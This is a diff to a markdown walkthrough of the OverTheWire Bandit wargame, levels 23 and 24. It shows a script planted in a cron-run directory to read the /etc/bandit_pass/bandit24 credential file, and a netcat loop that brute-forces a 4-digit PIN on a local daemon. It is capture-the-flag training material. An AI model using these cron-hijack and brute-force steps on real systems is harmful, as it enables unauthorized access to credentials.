@@ -227,15 +227,31 @@ NOTE 2: Keep in mind that your shell script is removed once executed, so you may
 - cronjob shows shell script is running at `/usr/bin/cronjob_bandit24.sh`
 - run `cat /usr/bin/cronjob_bandit24.sh`
 - shell script shows all scripts are run then deleted in /var/spool/$myname/foo
-- create temp folder to create script and save result: `mkdir /tmp/exploit`
-- run `cd /tmp/exploit`
+- create temp folder to create script and save result: `mktemp -d`
+- cd into that temp directory
 - run `vim exploit.sh`
 ```bash
 #!/bin/bash
 
-cat /etc/bandit_pass/bandit24 > /tmp/exploit/password
+cat /etc/bandit_pass/bandit24 > /tmp/[temp dir]/password
 ```
 - fix permissions: `chmod +x exploit.sh`
-- run `chmod 777 /tmp/exploit`
+- run `chmod 777 /tmp/[temp dir]`
 - copy script from tmp to cron executed location: `cp exploit.sh /var/spool/bandit24/foo/`
-- in a minute when cron executes, a password file will create in /tmp/exploit with the password to next level
+- in a minute when cron executes, a password file will create in /tmp/[temp dir] with the password to next level
+
+## level 24
+### problem
+A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
+You do not need to create new connections each time
+### solution
+- create and cd into temp dir with `mktemp -d`
+- create exploit shell script to send the password from current level and every four digit code filtering out responses that contain "Wrong"
+```bash
+#!/bin/bash
+
+password=$(cat /etc/bandit_pass/bandit24)
+for pin in {0000..9999}; do
+    echo "$password $pin"
+done | nc localhost 30002 | grep -v "Wrong"
+```
